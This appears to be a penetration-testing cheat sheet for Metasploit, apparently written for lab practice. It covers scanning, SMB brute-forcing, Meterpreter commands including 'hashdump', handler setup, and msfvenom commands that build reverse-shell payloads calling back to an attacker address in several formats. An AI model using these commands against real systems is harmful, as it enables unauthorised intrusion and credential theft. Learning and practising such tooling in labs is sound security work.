---
title: Metasploit Exploitation
sidebar_position: 2
---

## Scanning
- `search portscan` - List all potential scanning modules.
- `use auxiliary/scanner/portscan/tcp` - Select TCP port scanner.
- `show options` - Displays options for the payload.
- For faster scanning use `nmap` using the command `nmap -sS 10.10.12.229`.


## UDP Service Identification
- Use `scanner/discovery/udp_sweep` to find all services running over UDP.

## SMB Scans
- `smb_enumshares` and `smb_version` - Useful in corporate network.

## Useful Metasploit Scanner Modules
- `auxiliary/scanner/portscan/tcp` - Find all open tcp ports.
- `scanner/smb/smb_login` - Bruteforce SMB login.
- `auxiliary/scanner/netbios/nbname` - Find NetBIOS information.
- `auxiliary/scanner/http/http_version` - Show HTTP application version information.

## Metaspoit Database
- When working on multiple targets it could be confusing to set parameter values.
- Metasploit has a database function to simplify project management and setting up parameter values.
- To setup the database
    - Start postgresql database using `systemctl start postgresql`.
    - Initialize metasploit database using `msfdb init`.
    - Launch `msfconsole`.
    - Check database status using `db_status`.
- Metasploit database has a workspace feature to isolate different projects.
    - `workspace -h` - Displays help information about metasploit database.
    - `workspace -a` - Adds a new workspace.
    - `workspace <workspace_name>` - Switch to workspace.
    - `workspace -d` - Deletes a workspace.
    - `workspace -D` - Deletes all workspaces.
    - `workspace -r` - Rename a workspace. 
- Run `db_nmap` instead of `nmap` to save results to the database.
- Use information relevant to hosts and services using `hosts` and `services` respectively.
- Set a host as RHOSTS using `hosts -R` command.
- Search for a specific service using `services -S <service_name>` command.

## Vulnerability Scanning
- Use the scanner to find modules related to the potential vulnerabilities.
- Use `info` command to view details about the module.

## Useful Meterpreter commands
- `help` - View all the commands supported in meterpreter.
- `pwd` - Print working directory.
- `ls` - List the files in directory.
- `shell` - Drop into the shell of the remote system.
- `download` - Download a file from the remote system.
- `upload` - Upload a file from the attacker machine to remote machine.
- `sysinfo` - Prints the system information.
- `search -f <file_name>` - Finds a file in the target system.
- `hashdump` - Gets the password hash for the users in the target system.

## Msfvenom
- Show list of supported payloads using `msfvenom -l payloads`.
- Show list of supported output formats `msfvenom --list formats`.
- To encode a payload using `-e`. Encoding is not an effective way to bypass antivirus programs.

### Handlers
- `use exploit/multi/handler` initiates the handler.
- `set payload <payload_type>` - To set the payload type.
- `set lhost <attacker_host_ip>` - To set the local host.
- `set lport <attacker_port_number>` - To set the port for communication.
- `run` or `exploit` to start listening.

### Payload Generation

#### Linux
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
#### Windows
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

#### PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
- Remove the leading comment and add `?>` at the end of the generated payload file.

#### ASP
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

#### Python
```shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

## Escalate Previleges by Upgrading Shells
- Read here: https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html